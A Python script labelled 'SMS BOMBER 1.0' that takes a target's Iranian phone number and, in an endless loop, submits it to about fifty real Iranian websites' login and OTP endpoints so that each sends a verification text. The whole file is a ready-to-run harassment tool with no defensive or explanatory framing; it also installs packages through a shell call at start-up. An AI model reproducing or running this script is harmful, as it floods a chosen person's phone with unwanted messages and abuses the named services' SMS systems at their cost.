import os
os.system('pip install termcolor && pip install colored && pip install requests && clear')
import termcolor
from termcolor import colored
import requests
import time

print(colored(''' 

┌─────────────────────────────────────────────────────────────────────────────────────────────┐
│                                                                                             │
│                 ██╗   ██╗███████╗ ██████╗  █████╗ ███╗   ██╗███████╗██╗  ██╗                │
│                 ╚██╗ ██╔╝██╔════╝██╔════╝ ██╔══██╗████╗  ██║██╔════╝██║  ██║                │
│                  ╚████╔╝ █████╗  ██║  ███╗███████║██╔██╗ ██║█████╗  ███████║                │
│                   ╚██╔╝  ██╔══╝  ██║   ██║██╔══██║██║╚██╗██║██╔══╝  ██╔══██║                │
│                    ██║   ███████╗╚██████╔╝██║  ██║██║ ╚████║███████╗██║  ██║                │
│                    ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝                │
│                                                                          SMS BOMBER 1.0     │
└─────────────────────────────────────────────────────────────────────────────────────────────┘
   
 ''','yellow'))
 
Enter = input(colored('''ENTER FHONE NUMBER(09xxxxxxxxx) - - >''','red'))

while True:
    url1 = "https://api.digikala.com/v1/user/authenticate/"
    number1 = {"username":Enter}
    sms1 = requests.post(url1, data=number1)
    print(colored(sms1.status_code,'green')) 
    

    url2 = "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification"
    number2 = {"mobile":Enter}
    sms2 = requests.post(url2, data=number2)
    print(colored(sms2.status_code,'green'))
    
 
    url3 = "https://www.pubisha.com/login/checkCustomerActivation"
    number3 = {"mobile":Enter}
    sms3 = requests.post(url3, data=number3)
    print(colored(sms3.status_code,'green'))
    

    url4 = "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile"
    number4 = {"mobile":Enter}
    sms4 = requests.post(url4, data=number4)
    print(colored(sms4.status_code,'green'))
    

    url5 = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=4e012cac-7c9d-4a6f-b21e-c90fbe775139&locale=fa"
    number5 = {"cellphone":Enter}
    sms5 = requests.post(url5, data=number5)
    print(colored(sms5.status_code,'green'))
    

    url6 = "https://hiword.ir/wp-json/otp-login/v1/login"
    number6 = {"identifier":Enter}
    sms6 = requests.post(url6, data=number6)
    print(colored(sms6.status_code,'green'))
    

    url7 = "https://abantether.com/users/register/phone/send/"
    number7 = {"phoneNumber":Enter}
    sms7 = requests.post(url7, data=number7)
    print(colored(sms7.status_code,'green'))
    

    url8 = "https://api.bit24.cash/api/v3/auth/check-mobile"
    number8 = {"mobile":Enter}
    sms8 = requests.post(url8, data=number8)
    print(colored(sms8.status_code,'green'))
    

    url9 = "https://dicardo.com/main/sendsms"
    number9 = {"phone":Enter}
    sms9 = requests.post(url9, data=number9)
    print(colored(sms9.status_code,'green'))
    

    url10 = "https://ghasedak24.com/user/ajax_register"
    number10 = {"username":Enter}
    sms10 = requests.post(url10, data=number10)
    print(colored(sms10.status_code,'green'))
    

    url11 = "https://tikban.com/Account/LoginAndRegister"
    number11 = {"CellPhone":Enter}
    sms11 = requests.post(url11, data=number11)
    print(colored(sms11.status_code,'green'))
    

    url12 = "https://www.digistyle.com/users/login-register/"
    number12 = {"loginRegister[email_phone]":Enter}
    sms12 = requests.post(url12, data=number12)
    print(colored(sms12.status_code,'green'))
    
    
    url13 = "https://mobapi.banimode.com/api/v2/auth/request"
    number13 = {"phone":Enter}
    sms13 = requests.post(url13, data=number13)
    print(colored(sms13.status_code,'green'))
    

    url14 = "https://tagmond.com/phone_number"
    number14 = {"phone_number":Enter}
    sms14 = requests.post(url14, data=number14)
    print(colored(sms14.status_code,'green'))
    

    url15 = "https://banankala.com/home/login"
    number15 = {"Mobile":Enter}
    sms15 = requests.post(url15, data=number15)
    print(colored(sms15.status_code,'green'))
    

    url16 = "https://www.iranketab.ir/account/register"
    number16 = {"UserName":Enter}
    sms16 = requests.post(url16, data=number16)
    print(colored(sms16.status_code,'green'))
    

    url17 = "https://ketabchi.com/api/v1/auth/requestVerificationCode"
    number17 = {"phoneNumber":Enter}
    sms17 = requests.post(url17, data=number17)
    print(colored(sms17.status_code,'green'))
    

    url18 = f"https://join.tapsi.ir/smsConfirm?phoneNumber={Enter}"
    sms18 = requests.get(url18)
    print(colored(sms18.status_code,'green'))
    

    url19 = "https://www.offdecor.com/index.php?route=account/login/sendCode"
    number19 = {"phone":Enter}
    sms19 = requests.post(url19, data=number19)
    print(colored(sms19.status_code,'green'))
    

    url20 = "https://exo.ir/index.php?route=account/mobile_login"
    number20 = {"mobile_number":Enter}
    sms20 = requests.post(url20, data=number20)
    print(colored(sms20.status_code,'green'))
    

    url21 = "https://shahrfarsh.com/Account/Login"
    number21 = {"phoneNumber":Enter}
    sms21 = requests.post(url21, data=number21)
    print(colored(sms21.status_code,'green'))
    

    url22 = "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php"
    number22 = {"phone_email":Enter}
    sms22 = requests.post(url22, data=number22)
    print(colored(sms22.status_code,'green'))
    

    url23 = "https://shop.beheshticarpet.com/my-account/"
    number23 = {"billing_mobile":Enter}
    sms23 = requests.post(url23, data=number23)
    print(colored(sms23.status_code,'green'))

    url24 = f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={Enter}"
    sms24 = requests.post(url24)
    print(colored(sms24.status_code,'green'))

    url25 = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={Enter}"
    sms25 = requests.get(url25)
    print(colored(sms25.status_code,'green'))

    url26 = "https://www.khanoumi.com/accounts/sendotp"
    number26 = {"mobile":Enter}
    sms26 = requests.post(url26, data=number26)
    print(colored(sms26.status_code,'green'))

    url27 = "https://rojashop.com/api/auth/sendOtp"
    number27 = {"mobile":Enter}
    sms27 = requests.post(url27, data=number27)
    print(colored(sms27.status_code,'green'))

    url28 = "https://dadpardaz.com/advice/getLoginConfirmationCode"
    number28 = {"mobile":Enter}
    sms28 = requests.post(url28, data=number28)
    print(colored(sms28.status_code,'green'))

    url29 = "https://api.rokla.ir/api/request/otp"
    number29 = {"mobile":Enter}
    sms29 = requests.post(url29, data=number29)
    print(colored(sms29.status_code,'green'))

    url30 = "https://khodro45.com/api/v1/customers/otp/"
    number30 = {"mobile":Enter}
    sms30 = requests.post(url30, data=number30)
    print(colored(sms30.status_code,'green'))

    url31 = "https://mashinbank.com/api2/users/check"
    number31 = {"mobileNumber":Enter}
    sms31 = requests.post(url31, data=number31)
    print(colored(sms31.status_code,'green'))

    url32 = "https://api.pezeshket.com/core/v1/auth/requestCode"
    number32 = {"mobileNumber":Enter}
    sms32 = requests.post(url32, data=number32)
    print(colored(sms32.status_code,'green'))

    url33 = "https://api.timcheh.com/auth/otp/send"
    number33 = {"mobile":Enter}
    sms33 = requests.post(url33, data=number33)
    print(colored(sms33.status_code,'green'))

    url34 = f"https://api.helsa.co/api/User/GetRegisterCode?mobileNumber={Enter}&deviceId=050102153736100048967953736091842424&discountCode=&utm_content=&utm_source=&utm_campain="
    sms34 = requests.get(url34)
    print(colored(sms34.status_code,'green'))

    url35 = "https://client.api.paklean.com/user/resendCode"
    number35 = {"username":Enter}
    sms35 = requests.post(url35, data=number35)
    print(colored(sms35.status_code,'green'))

    url36 = "https://mobogift.com/signin"
    number36 = {"username":Enter}
    sms36 = requests.post(url36, data=number36)
    print(colored(sms36.status_code,'green'))

    url37 = "https://api.iranicard.ir/api/v1/register"
    number37 = {"mobile":Enter}
    sms37 = requests.post(url37, data=number37)
    print(colored(sms37.status_code,'green'))
    
    url38 = f"https://pubg-sell.ir/loginuser?username={Enter}"
    sms38 = requests.get(url38)
    print(colored(sms38.status_code,'green'))

    url39 = "https://tj8.ir/auth/register"
    number39 = {"mobile":Enter}
    sms39 = requests.post(url39, data=number39)
    print(colored(sms39.status_code,'green'))

    url40 = "https://www.digistyle.com/users/login-register/"
    number40 = {"loginRegister[email_phone]":Enter}
    sms40 = requests.post(url40, data=number40)
    print(colored(sms40.status_code,'green'))

    url41 = "https://cinematicket.org/api/v1/users/signup"
    number41 = {"phone_number":Enter}
    sms41 = requests.post(url41, data=number41)
    print(colored(sms41.status_code,'green'))

    url42 = "https://www.irantic.com//api/login/request"
    number42 = {"mobile":Enter}
    sms42 = requests.post(url42, data=number42)
    print(colored(sms42.status_code,'green'))

    url43 = "https://kafegheymat.com/shop/getLoginSms"
    number43 = {"phone":Enter}
    sms43 = requests.post(url43, data=number43)
    print(colored(sms43.status_code,'green'))

    url44 = "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85"
    number44 = {"cellphone":Enter}
    sms44 = requests.post(url44, data=number44)
    print(colored(sms44.status_code,'green'))

    url45 = "https://www.delino.com/user/register"
    number45 = {"mobile":Enter}
    sms45 = requests.post(url45, data=number45)
    print(colored(sms45.status_code,'green'))

    url46 = "https://alopeyk.com/api/sms/send.php"
    number46 = {"phone":Enter}
    sms46 = requests.post(url46, data=number46)
    print(colored(sms46.status_code,'green'))

    url47 = f"https://filmnet.ir/api-v2/access-token/users/{Enter}/otp"
    sms47 = requests.get(url47)
    print(colored(sms47.status_code,'green'))

    url48 = f"https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{Enter}/sms?cCode=+98"
    sms48 = requests.get(url48)
    print(colored(sms48.status_code,'green'))

    url49 = "https://1401api.tamland.ir/api/user/signup"
    number49 = {"Mobile":Enter}
    sms49 = requests.post(url49, data=number49)
    print(colored(sms49.status_code,'green'))

    url50 = "https://www.offdecor.com/index.php?route=account/login/sendCode"
    number50 = {"phone":Enter}
    sms50 = requests.post(url50, data=number50)
    print(colored(sms50.status_code,'green'))